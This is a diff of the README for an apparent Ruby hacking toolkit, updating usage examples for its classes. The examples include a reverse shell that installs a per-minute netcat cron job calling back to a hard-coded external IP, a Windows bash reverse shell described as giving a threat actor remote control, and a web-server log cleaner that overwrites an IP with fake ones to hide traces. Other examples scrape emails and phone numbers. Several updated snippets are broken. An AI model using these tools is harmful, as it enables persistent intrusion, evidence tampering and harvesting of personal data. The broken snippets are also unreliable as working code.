@@ -181,7 +181,15 @@ d.drupal_score
 Get IP of a site using Nslookup and ping.
 
 ```ruby
-Snackhack2::IpLookup.new("https://google.com").run
+ip = Snackhack2::IpLookup.new
+ip.site = "https://google.com"
+ip = run
+```
+
+```ruby
+ip = Snackhack2::IpLookup.new
+ip.site = "https://google.com"
+ip.socket
 ```
 ## Extract Emails from Website
 
@@ -203,7 +211,9 @@ puts e.max_depth
 You supply a IP and the code will find all the traces of the ip in the web server Log file and replace it with a fake IP that is randomly generated . By default it reads from "/var/log/access.log", but that can be changed. It has to be ran with root.
 
 ```ruby
-Snackhack2::WebServerCleaner.new('83.149.9.216').run
+wc = Snackhack2::WebServerCleaner.new
+wc.ip = '83.149.9.216'
+wc.run
 ```
 
 ## WordPress
@@ -254,13 +264,19 @@ end
 Will print out the command to run and will set a cron job that will run every minute that will use Netcat to connect to the server. 
 
 ```ruby
-Snackhack2::ReverseShell.new("167.71.98.144", "99").run
+rs = Snackhack2::ReverseShell.new
+rs.ip   = "167.71.98.144"
+rs.port = "99"
+rs.run
 ```
 
 This will use bash.exe to connect to a reverse shell. On the remote computer run: `nc -lvp 4444`. After running the code below the computer will connect to the remote server, giving the threat actor remote control of the computer. This is all done by Living of the land, without any third party tools, just the features built into Windows. This is favored by threat actors since they do not need to install any malware that could be detected and remvoed.
 
 ```ruby
-rs = Snackhack2::ReverseShell.new("127.0.0.1", "4444")
+rs = Snackhack2::ReverseShell.new
+rs.ip   = "167.71.98.144"
+rs.port = "99"
+
 rs.bash
 
 
@@ -321,7 +337,8 @@ Grab all the links in a site and save it in a file named `google.com_links.txt` 
 
 
 ```ruby
-links = Snackhack2::WebsiteLinks.new("https://www.bleepingcomputer.com/news/security/signal-downplays-encryption-key-flaw-fixes-it-after-x-drama/")
+links = Snackhack2::WebsiteLinks.new
+links.site = "https://www.bleepingcomputer.com/news/security/signal-downplays-encryption-key-flaw-fixes-it-after-x-drama/"
 links.run
 
 # set @save_file as false
@@ -355,7 +372,8 @@ SnackHack::read_serverversion
 This uses multi thread to scan the first 1,000 ports and print the open ports. 
 
 ```ruby
-tcp = Snackhack2::PortScan.new("167.71.98.134")
+tcp = Snackhack2::PortScan.new
+tcp = "167.71.98.134"
 tcp.run
 ```
 
@@ -395,8 +413,17 @@ end
 This could be used to find other sites on the web that uses the same g code
 
 ```ruby
-ga = Snackhack::GoogleAnalytics.new("https://g-form.com")
+ga = Snackhack::GoogleAnalytics.new
+ga.site = "https://g-form.com"
 ga.run
+```
+
+## Website Meta Data
+
+```ruby
+me = Snackhack2::WebsiteMeta.new
+me.site = 'https://kinsta.com'
+me.run
 ```
 
 ## Banner grabber with cURL
@@ -468,7 +495,8 @@ Get phone numbers from a site. Use the following command to install spidr
  ```
 
 ```ruby
-wp = Snackhack2::PhoneNumber.new('https://pastebin.com/PgJuhznU')
+wp = Snackhack2::PhoneNumber.new
+wp.site = "https://pastebin.com/PgJuhznU"
 wp.run
 
 ```
@@ -476,7 +504,8 @@ wp.run
 ## Phone Number Web Spider
 
 ```ruby
-pn = Snackhack2::PhoneNumber.new('https://utica.edu/people')
+pn = Snackhack2::PhoneNumber.new
+pn.site = "https://google.com"
 pn.spider
 # will print the phone numbers instead of saving them to file
 ph.save_file = false
